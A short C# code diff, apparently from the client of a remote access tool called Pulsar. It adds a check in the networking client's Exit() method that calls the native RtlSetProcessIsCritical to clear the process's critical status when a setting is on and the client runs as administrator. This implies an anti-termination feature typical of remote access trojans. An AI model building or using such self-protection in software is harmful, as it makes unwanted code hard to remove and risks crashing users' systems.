@@ -13,6 +13,8 @@ using System;
 using System.Diagnostics;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
+using Pulsar.Common.UAC;
+using Pulsar.Client.Utilities;
 
 namespace Pulsar.Client.Networking
 {
@@ -167,6 +169,11 @@ namespace Pulsar.Client.Networking
         /// </summary>
         public void Exit()
         {
+            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
+            {
+                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
+            }
+
             _tokenSource.Cancel();
             Disconnect();
         }
